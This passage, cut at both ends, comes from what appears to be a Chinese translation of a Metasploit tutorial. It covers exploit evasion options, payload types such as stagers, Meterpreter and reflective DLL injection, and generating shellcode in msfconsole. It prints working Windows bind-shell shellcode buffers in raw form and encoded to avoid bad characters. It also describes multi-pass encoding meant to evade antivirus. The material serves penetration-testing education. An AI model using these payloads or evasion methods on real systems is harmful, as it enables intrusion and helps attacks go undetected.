   Description    : The local client port 
...snip... 
Evasion 
msf exploit(ms09_050_smb2_negotiate_func_index) > show evasion 
Module evasion options: 
   Name           : SMB::obscure_trans_pipe_level 
   Current Setting: 0 
   Description    : Obscure PIPE string in TransNamedPipe (level 0-3) 
   Name           : SMB::pad_data_level 
   Current Setting: 0 
   Description    : Place extra padding between headers and data (level 0-3) 
   Name           : SMB::pad_file_level 
   Current Setting: 0 
   Description    : Obscure path names used in open/create (level 0-3) 
...snip... 
Payloads 
Measploit 有三种不同类型的 payload: Singles, Stagers, Stages. 
这些不同类型的模块有很大的通用性，在很多场景下，它们都很有效. 
判断一个 payload 是否阶段性的，以 payload 名前面的’/’为准.例如: 
windows/shell_bind_tcp  是一个独立的 payload 模块， 
windows/shell/bind_tcp 则是由 bind_tcp(stager)与 shell(stage)组成. 
Singles 
独立类型的 payload，完全独立，包含自己运行所需的条件。一个独立的 payload 可以完成一
些简单的任务，例如添加用户或执行计算器. 
Stagers 
Stagers 小而可靠，主要用于在攻击者与受害者之间建立网络连接。要一直满足上面的要求是很
困难的，这就导致出现了多个类似的 stagers。如果可以，Metasploit 能够选择最合适的
stagers，当然在需要的时候，也可以选择其他的. 
Windows NX vs NO-NX Stagers 
NX CPUs 和 DEP 的可靠性问题 
NX stagers 比较大(VirtualAlloc) 
默认兼容 NX + WIN7 
Stages 
Stages 指那些被 Stagers 模块下载的攻击载荷组件.不同类型的 stages 攻击载荷拥有不同的
特性，例如: Meterpreter,VNC Injection,iPhone ‘ipwn’ shell 这些都是没有大小限
制的. 
Stages 会自动调用’middle stagers’ 
一个单独的 recv()不能够完成大型 payloads 的接收工作. 
Stager 可以接受中型 stager 
中型 stager 可以完成一次完整的下载 
也比 RWX 优秀 
Payload Types 
Metasploit 包含许多不同类型的 payloads，每个都有它独特的作用。下面来了解一下各种类
型的 payloads. 
Inline(Non Staged) 
一个独立的 payload，包含溢出代码和用于特定任务的 shellcode。Inline payload 较同类
型的 payload 稳定，因为它们将所有的功能都集中在一起。然而，也有一些大小的有效载荷无法
得到支持. 
Staged 
Stager payload 与 stage payload 一同用于完成指定任务。Stager 用于在攻击者与受害者
间建立连接，并在远程主机上执行 stage payload. 
Meterpreter 
Meterpreter，是 Meta-Interpreter 的缩写，它是一个高级的，多方位的 payload。
Meterpreter 驻留在远程主机的内存中，不会在磁盘上留下任何记录，这让传统的鉴定技术很难
发现。脚本和插件可以按照需求动态的加载与卸载，Meterpreter 的开发也在不断的完善和强
大。 
PassiveX 
PassiveX 可用于避开限制性出站防火墙，主要是通过 ActiveX control 创建一个隐藏的 IE
实例，使用这个新的 ActiveX control 对象，来与攻击者进行 HTTP 交互。 
NoNX 
NX(No eXecute)字节位属于某些 CPU 的特性，用于阻止代码从内存中执行.Windows 系统中的
常见 NX 为 DEP。Metasploit NoNX 主要用于避开 DEP。 
Ord 
优点: 
对 Windowx 9x 后各语言版本有效，无须严格定义一个返回地址. 
相当小 
不足: 
依赖 ws2_32.dll，在溢出前，进程需要已经加载它. 
较其他 stagers payload 而言，稳定性不是很好. 
IPv6 
用于 IPv6 网络 
Reflective DLL Injection 
反射型 DLL 注入，是一种将 stage payload 直接注入主机内存，不与主机磁盘交互的机制.VNC
和 Meterpreter payloads 均采用的是这种方式. 
详情请查阅:  
Reflective DLL Injection 
http://blog.harmonysecurity.com/2008/10/new-paper-reflective-dll-
injection.html 
Generating Payloads 
在溢出代码的开发过程中，你可能需要生成 exploit 所需的 shellcode。msfconsole 可以用
于生成 payloads。当你启用一个 payload，Metasploit 会添
加’generate’，’pry’，’reload’命令，其中 generate 即关注 payload 产生这一块. 
msf > use payload/windows/shell_bind_tcp 
msf payload(shell_bind_tcp) > help 
...snip... 
    Command       Description 
    -------       ----------- 
    generate      Generates a payload 
    pry           Open a Pry session on the current module 
    reload        Reload the current module from disk 
’generate -h’查看一下’generate’命令各参数的用法. 
msf payload(shell_bind_tcp) > generate -h 
Usage: generate [options] 
Generates a payload. 
OPTIONS: 
    -E        Force encoding. 
    -b   The list of characters to avoid: '\x00\xff' 
    -e   The name of the encoder module to use. 
    -f   The output file name (otherwise stdout) 
    -h        Help banner. 
    -i   the number of encoding iterations. 
    -k        Keep the template executable functional 
    -o   A comma separated list of options in VAR=VAL format. 
    -p   The Platform for output. 
    -s   NOP sled length. 
    -t   The output format: 
raw,ruby,rb,perl,pl,c,js_be,js_le,java,dll,exe,exe-
small,elf,macho,vba,vbs,loop-vbs,asp,war 
    -x   The executable template to use 
使用’generate’命令，不指定任何选项，可以直接生成 shellcode. 
msf payload(shell_bind_tcp) > generate 
# windows/shell_bind_tcp - 341 bytes 
# http://www.metasploit.com 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + 
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + 
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + 
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" + 
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" + 
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" + 
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" + 
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" + 
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" + 
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" + 
"\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f" + 
"\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29" + 
"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50" + 
"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x31" + 
"\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68" + 
"\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff" + 
"\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7" + 
"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" + 
"\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44" + 
"\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56" + 
"\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86" + 
"\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60" + 
"\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5" + 
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f" + 
"\x6a\x00\x53\xff\xd5" 
当然，像这样没有任何调整的 shellcode 是很少见的，大部分情况下，我们不这样做.针对目标
机，破坏性的字符和特定的编码器会被使用. 
上面的 shellcode 包含一个较普遍的坏字符(\x00).有些 exploits 允许我们使用它，但不多.
这次让我们来去掉这个不想要的字符，生成同样的 shellcode. 
为了完成这个任务，我们需要在’generate’的’-b’参数后面加上不想要的字节. 
msf  payload(shell_bind_tcp) > generate -b '\x00' 
# windows/shell_bind_tcp - 368 bytes 
# http://www.metasploit.com 
# Encoder: x86/shikata_ga_nai 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xdb\xde\xba\x99\x7c\x1b\x5f\xd9\x74\x24\xf4\x5e\x2b\xc9" + 
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x8d\x9e\xee\xa3" + 
"\x45\xd7\x11\x5c\x95\x88\x98\xb9\xa4\x9a\xff\xca\x94\x2a" + 
"\x8b\x9f\x14\xc0\xd9\x0b\xaf\xa4\xf5\x3c\x18\x02\x20\x72" + 
"\x99\xa2\xec\xd8\x59\xa4\x90\x22\x8d\x06\xa8\xec\xc0\x47" + 
"\xed\x11\x2a\x15\xa6\x5e\x98\x8a\xc3\x23\x20\xaa\x03\x28" + 
"\x18\xd4\x26\ 
...snip... 
Null 字节被成功移除，但是 shellcode 发现发生了变化，原来的是 341 字节，现在变为 368
字节，增加了 27 个字节. 
在产生 shellcode 的过程中，Null 字节或者一些其他无用的字节，需要被替换(或编码),以确
保我们的 shell 仍可以发挥它的作用. 
另外一种选择，就是采用编码器.默认情况下，Metasploit 会使用最好的编码器来完成这项任
务。 
当指定坏字符，Metasploit 会使用最好的编码器.如果只是 Null 字节限制，那么会使用’ 
x86/shikata_ga_nai’编码器.如果我们添加一些破坏性的字符，那么一个不同的编码器会被使用. 
msf  payload(shell_bind_tcp) > generate -b 
'\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b' 
# windows/shell_bind_tcp - 366 bytes 
# http://www.metasploit.com 
# Encoder: x86/fnstenv_mov 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\x6a\x56\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xbf" + 
"\x5c\xbf\xe8\x83\xeb\xfc\... 
...snip... 
Metasploit 有能力处理一些字符，但是如果指定的字符很多而不指定编码器，可能会出现下面
的消息. 
msf  payload(shell_bind_tcp) > generate -b 
'\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x
01\xcc\6e\x1e\x2e\x26' 
[-] Payload generation failed: No encoders encoded the buffer 
successfully. 
就像上面所提到的，Metasploit 在生成我们所需的 payload 时，会选择最合适的编码器。然而
现在我们想指定一个我们需要的类型，而不是让 Metasploit 帮我们选择。想象一下一个包含非
字母数字的漏洞成功的执行。’shikata_ga_nai’编码器在这种情况下会不合适，因为它会对每
个字符进行编码。 
接下来看一下编码器列表: 
msf  payload(shell_bind_tcp) > show encoders 
Encoders 
======== 
   Name                    Disclosure Date  Rank       Description 
   ----                    ---------------  ----       ----------- 
...snip... 
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder 
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder 
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder 
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder 
   x86/countdown                            normal     Single-byte XOR Countdown Encoder 
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder 
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder 
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder 
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder 
   x86/countdown                            normal     Single-byte XOR Countdown Encoder 
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder 
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder 
   x86/nonalpha                             low        Non-Alpha Encoder 
   x86/nonupper                             low        Non-Upper Encoder 
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder 
   x86/single_static_bit                    manual     Single Static Bit 
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder 
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder 
接着我们用’nonalpha’编码器来重新生成， 
msf  payload(shell_bind_tcp) > generate -e x86/nonalpha 
# windows/shell_bind_tcp - 489 bytes 
# http://www.metasploit.com 
# Encoder: x86/nonalpha 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\x66\xb9\xff\xff\xeb\x19\x5e\x8b\xfe\x83\xc7\x70\x8b\xd7" + 
"\x3b\xf2\x7d\x0b\xb0\x7b\xf2\xae\xff\xcf\xac\x28\x07\xeb" + 
"\xf1\xeb\x75\xe8\xe2\xff\xff\xff\x17\x29\x29\x29\x09\x31" + 
"\x1a\x29\x24\x29\x39\x03\x07\x31\x2b\x33\x23\x32\x06\x06" + 
"\x23\x23\x15\x30\x23\x37\x1a\x22\x21\x2a\x23\x21\x13\x13" + 
"\x04\x08\x27\x13\x2f\x04\x27\x2b\x13\x10\x2b\x2b\x2b\x2b" + 
"\x2b\x2b\x13\x28\x13\x11\x25\x24\x13\x14\x28\x24\x13\x28" + 
"\x28\x24\x13\x07\x24\x13\x06\x0d\x2e\x1a\x13\x18\x0e\x17" + 
"\x24\x24\x24\x11\x22\x25\x15\x37\x37\x37\x27\x2b\x25\x25" + 
"\x25\x35\x25\x2d\x25\x25\x28\x25\x13\x02\x2d\x25\x35\x13" + 
"\x25\x13\x06\x34\x09\x0c\x11\x28\xfc\xe8\x89\x00\x00\x00" + 
...snip... 
结果同设想的一样，我们的 payload 不包含任何字符数字。但是在使用非默认编码器的时候，我
们需要注意，得到的 payload 会较大。 
接下来，使用’-f’参数，将生成的 payload 输出到一个文件里面。 
msf  payload(shell_bind_tcp) > generate -b '\x00' -e x86/shikata_ga_nai 
-f /root/msfu/filename.txt 
[*] Writing 1803 bytes to /root/msfu/filename.txt... 
msf  payload(shell_bind_tcp) > cat ~/msfu/filename.txt 
[*] exec: cat ~/msfu/filename.txt 
# windows/shell_bind_tcp - 368 bytes 
# http://www.metasploit.com 
# Encoder: x86/shikata_ga_nai 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xdb\xcb\xb8\x4f\xd9\x99\x0f\xd9\x74\x24\xf4\x5a\x2b\xc9" + 
"\xb1\x56\x31\x42\x18\x83\xc2\x04\x03\x42\x5b\x3b\x6c\xf3" + 
"\x8b\x32\x8f\x0c\x4b\x25\x19\xe9\x7a\x77\x7d\x79\x2e\x47" + 
"\xf5\x2f\xc2\x2c\x5b\xc4\x51\x40\x74\xeb\xd2\xef\xa2\xc2" + 
"\xe3\xc1\x6a\x88\x27\x43\x17\xd3\x7b\xa3\x26\x1c\x8e\xa2" + 
"\x6f\x41\x60\xf6\x38\x0d\xd2\xe7\x4d\x53\xee\x06\x82\xdf" + 
"\x4e\x71\xa7\x20\x3a\xcb\xa6\x70\x92\x40\xe0\x68\x99\x0f" + 
"\xd1\x89\x4e\x4c\x2d\xc3\xfb\xa7\xc5\xd2\x2d\xf6\x26\xe5" + 
...snip... 
使用’-i’参数，就是指明在产生最终 payload 前，所需的编码次数。多次编码的目的是绕过反病
毒检测。 
下面对比一下进行一次编码与两次编码的 shellcode. 
msf  payload(shell_bind_tcp) > generate -b '\x00' 
# windows/shell_bind_tcp - 368 bytes 
# http://www.metasploit.com 
# Encoder: x86/shikata_ga_nai 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xdb\xd9\xb8\x41\x07\x94\x72\xd9\x74\x24\xf4\x5b\x2b\xc9" + 
"\xb1\x56\x31\x43\x18\x03\x43\x18\x83\xeb\xbd\xe5\x61\x8e" + 
"\xd5\x63\x89\x6f\x25\x14\x03\x8a\x14\x06\x77\xde\x04\x96" + 
"\xf3\xb2\xa4\x5d\x51\x27\x3f\x13\x7e\x48\x88\x9e\x58\x67" + 
"\x09\x2f\x65\x2b\xc9\x31\x19\x36\x1d\x92\x20\xf9\x50\xd3" + 
"\x65\xe4\x9a\x81\x3e\x62\x08\x36\x4a\x36\x90\x37\x9c\x3c" + 
...snip... 
msf  payload(shell_bind_tcp) > generate -b '\x00' -i 2 
# windows/shell_bind_tcp - 395 bytes 
# http://www.metasploit.com 
# Encoder: x86/shikata_ga_nai 
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,  
# InitialAutoRunScript=, AutoRunScript= 
buf =  
"\xbd\xea\x95\xc9\x5b\xda\xcd\xd9\x74\x24\xf4\x5f\x31\xc9" + 
"\xb1\x5d\x31\x6f\x12\x83\xc7\x04\x03\x85\x9b\x2b\xae\x80" + 
"\x52\x72\x25\x16\x6f\x3d\x73\x9c\x0b\x38\x26\x11\xdd\xf4" + 
"\x80\xd2\x1f\xf2\x1d\x96\x8b\xf8\x1f\xb7\x9c\x8f\x65\x96" + 